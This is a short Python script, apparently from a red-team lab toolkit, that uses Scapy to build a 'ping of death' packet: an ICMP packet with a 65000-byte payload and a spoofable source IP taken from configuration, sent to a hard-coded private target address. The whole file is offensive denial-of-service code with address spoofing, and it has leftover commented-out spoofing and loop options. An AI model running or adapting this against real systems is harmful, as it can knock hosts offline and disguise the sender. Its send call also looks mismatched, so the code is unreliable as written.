from scapy.all import *
from red.config import config

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"

def run():#SOURCE_IP = "10.1.5.3", count=5):
    ping_of_death = IP(src=config.attack.ip, dst=TARGET_IP)/ICMP()/("A"*65000)

    # for _ in range(count):
    print(srp1(ping_of_death))